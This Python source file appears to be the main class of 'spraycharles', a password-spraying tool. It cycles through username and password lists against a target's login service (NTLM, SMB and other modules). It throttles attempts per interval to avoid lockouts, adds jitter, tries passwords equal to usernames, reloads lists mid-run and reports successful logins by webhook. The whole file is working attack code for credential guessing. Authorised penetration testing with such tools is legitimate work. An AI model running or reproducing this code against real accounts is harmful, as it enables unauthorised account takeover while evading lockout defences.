#!/usr/bin/env python3
import datetime
import logging
import pathlib
import random
import time
from pathlib import Path
from time import sleep

import requests
from rich import print
from rich.progress import Progress
from rich.table import Table
from rich.prompt import Confirm

from spraycharles import __version__
from spraycharles.lib.logger import console, logger
from spraycharles.lib.analyze import Analyzer
from spraycharles.targets import all as all_modules


class Spraycharles:
    def __init__( self, user_list, user_file, password_list, password_file, host, module,
                 path, output, attempts, interval, equal, timeout, port, fireprox, domain,
                 analyze, jitter, jitter_min, notify, webhook, pause, no_ssl, debug, quiet):

        self.passwords = password_list
        self.password_file = Path(password_file)
        self.usernames = user_list
        self.user_file = Path(user_file)
        self.host = host
        self.module = module
        self.path = path
        self.output = output
        self.attempts = attempts
        self.interval = interval
        self.equal = equal
        self.timeout = timeout
        self.port = port
        self.fireprox = fireprox
        self.domain = domain
        self.analyze = analyze
        self.jitter = jitter
        self.jitter_min = jitter_min
        self.notify = notify
        self.webhook = webhook
        self.pause = pause
        self.no_ssl = no_ssl
        #self.debug = debug
        #self.quiet = quiet
        self.print = False if debug or quiet else True

        self.total_hits = 0
        self.login_attempts = 0
        self.target = None
        self.log_name = None

        # 
        # Create spraycharles directories if they don't exist
        #
        user_home = Path.home()
        spraycharles_dir = user_home / ".spraycharles"
        logs_dir = spraycharles_dir / "logs"
        out_dir = spraycharles_dir / "out"
        
        spraycharles_dir.mkdir(exist_ok=True)
        logs_dir.mkdir(exist_ok=True)
        out_dir.mkdir(exist_ok=True)

        # 
        # Build default output file
        #
        current = datetime.datetime.now(datetime.UTC)
        timestamp = current.strftime("%Y%m%d-%H%M%S")
    
        if self.output is None:
            self.output = Path(f"{user_home}/.spraycharles/out/{host}_{timestamp}.json")
        else:
            self.output = Path(self.output)
            
        #
        # Overwrite output file if it already exists
        #
        if self.output.exists():
            self.output.unlink()


    def initialize_module(self):
        for target in all_modules:
            if self.module == target.NAME:
                logger.debug(f"Using {target.NAME} module")
                self.target = target(self.host, self.port, self.timeout, self.fireprox)
                 
                #
                # NTLM module requires path to be set
                #
                if self.target.NAME == "NTLM":
                    self.target.set_path(self.path)

                #
                # Modules default to HTTPS, switch to HTTP if --no-ssl set
                #
                if self.no_ssl:
                    self.target.set_plain_http()

        #
        # Create the logfile
        #
        user_home = str(Path.home())
        current = datetime.datetime.now()
        timestamp = int(round(current.timestamp()))

        self.log_name = f"{user_home}/.spraycharles/logs/{self.host}_{timestamp}.log"
        
        #
        # Logfile will use the default logger and UTC time
        # This file will not contain passwords (output JSON file will)
        #
        logging.basicConfig(
            filename=self.log_name,
            level=logging.INFO,
            format="%(asctime)s UTC - %(levelname)s - %(message)s",
        )
        logging.Formatter.converter = time.gmtime


    #
    # Display table with spray configs
    #
    def pre_spray_info(self):
        spray_info = Table(
            show_header=False,
            show_footer=False,
            min_width=61,
            title=f"Module: {self.module.upper()}",
            title_justify="left",
            title_style="bold reverse",
        )

        spray_info.add_row("Target", f"{self.target.url}")

        if self.domain:
            spray_info.add_row("Domain", f"{self.domain}")

        if self.attempts:
            spray_info.add_row("Interval", f"{self.interval} minutes")
            spray_info.add_row("Attempts", f"{self.attempts} per interval")

        if self.jitter:
            spray_info.add_row("Jitter", f"{self.jitter_min}-{self.jitter} seconds")

        if self.notify:
            spray_info.add_row("Notify", f"True ({self.notify.value})")

        log_name = pathlib.PurePath(self.log_name)
        out_name = pathlib.PurePath(self.output)
        spray_info.add_row("Logfile", f"{log_name.name}")
        spray_info.add_row("Results", f"{out_name.name}")

        console.print(spray_info)

        print()
        Confirm.ask(
            "[blue]Press enter to begin",
            default=True,
            show_choices=False,
            show_default=False,
        )
        print()

        if self.module == "SMB":
            logger.info(f"Initiaing SMB connection to {self.host}")
            if self.target.get_conn():
                logger.info(f"Connected to {self.host} over {'SMBv1' if self.target.smbv1 else 'SMBv3'}")
                logger.info(f"Hostname: {self.target.hostname}")
                logger.info(f"Domain: {self.target.domain}")
                logger.info(f"OS: {self.target.os}")
                print()
            else:
                logger.warning(f"Failed to connect to {self.host} over SMB")
                exit()

        if self.print:
            self.target.print_headers()


    #
    # Check if attempts limit has been reached and sleep if necessary
    #
    def _check_sleep(self):
        if self.login_attempts == self.attempts:

            #
            # Optionally run result analysis
            #
            if self.analyze:
                analyzer = Analyzer(self.output, self.notify, self.webhook, self.host, self.total_hits)
                new_hit_total = analyzer.analyze()

                # 
                # Pausing if specified by user before continuing with spray
                #
                if new_hit_total > self.total_hits and self.pause:
                    print()
                    logger.info("Identified new potentially successful login! Pausing...")
                    print()

                    Confirm.ask(
                        "[blue]Press enter to continue",
                        default=True,
                        show_choices=False,
                        show_default=False,
                    )

                #
                # New hit total becomes the total hits for next analysis interation
                #
                self.total_hits = new_hit_total

            #
            # Sleep for interval
            #
            print()
            logger.info(f"Sleeping until {(datetime.datetime.now() + datetime.timedelta(minutes=self.interval)).strftime('%m-%d %H:%M:%S')}")
            time.sleep(self.interval * 60)
            print()

            #
            #  Reset the counter
            #
            self.login_attempts = 0


    def _check_file_contents(self, file_path, current_list):
        new_list = []
        try:
            with open(file_path, "r") as f:
                new_list = f.read().splitlines()
        except:
            # file either no longer exists, or -p flag was given a password and not a file
            pass

        additions = list(set(new_list) - set(current_list))
        return additions


    def _login(self, username, password):
        try:
            response = self.target.login(username, password)
            self.target.print_response(response, self.output, print_to_screen=self.print)
        except requests.ConnectTimeout as e:
            self.target.print_response(None, self.output, timeout=True, print_to_screen=self.print)
        except (requests.ConnectionError, requests.ReadTimeout, OSError) as e:
            print()
            logger.warning("Connection error - sleeping for 5 seconds")

            sleep(5)
            self._login(username, password)

    
    #
    # Calculate jitter and sleep
    #
    def _jitter(self):
        if self.jitter:
            num = random.randint(self.jitter_min, self.jitter)
            logger.debug(f"Jitter sleep: {num} seconds")
            sleep(num)

    
    #
    # Perform one attempt per username with password = username
    #
    def _spray_equal(self):
        with Progress(transient=True, console=console) as progress:
            task = progress.add_task(f"[yellow]Password = Username", total=len(self.usernames))
            
            for indx, username in enumerate(self.usernames):
                if indx > 0:
                    self._jitter()

                #
                # If we have an email address, strip the @domain
                #
                password = username.split("@")[0]

                self._login(username, password)
                progress.update(task, advance=1)

                #
                # Log attempt to logfile
                #
                logging.info(f"Login attempted as {username}")

            self.login_attempts += 1


    #
    # Main spray logic
    #
    def spray(self):
        # 
        # Spray once with password = username if flag present
        #
        if self.equal:
            self._spray_equal()

        #
        # Spray using provided password [file]
        #
        for password in self.passwords:
            self._check_sleep()

            # check if user/pass files have been updated and add new entries to current lists
            # this will let users add (but not remove) users/passwords into the spray as it runs
            new_users = self._check_file_contents(self.user_file, self.usernames)
            new_passwords = self._check_file_contents(
                self.password_file, self.passwords
            )

            if len(new_users) > 0:
                logger.info(f"Adding {len(new_users)} new users into the spray!")
                self.usernames.extend(new_users)

            if len(new_passwords) > 0:
                logger.info(f"Adding {len(new_passwords)} new passwords to the end the spray!")
                self.passwords.extend(new_passwords)

            # print line separator
            if len(new_passwords) > 0 or len(new_users) > 0:
                print()

            with Progress(transient=True, console=console) as progress:
                task = progress.add_task(f"[green]Spraying: {password}", total=len(self.usernames))
                
                for indx, username in enumerate(self.usernames):

                    #
                    # If we did a spray with password = username, we'll need jitter, even on first iteration
                    #
                    if self.equal:
                        self._jitter()
                    elif indx > 0:
                        self._jitter()
                    
                    if self.domain:
                        username = f"{self.domain}\\{username}"
                    
                    self._login(username, password)
                    
                    progress.update(task, advance=1)

                    #
                    # Log attempt to logfile
                    #
                    logging.info(f"Login attempted as {username}")

            self.login_attempts += 1

        #
        # The spray is complete, let's analyze results
        #
        logger.info("Spray complete!")
        analyzer = Analyzer(self.output, self.notify, self.webhook, self.host, self.total_hits)
        analyzer.analyze()
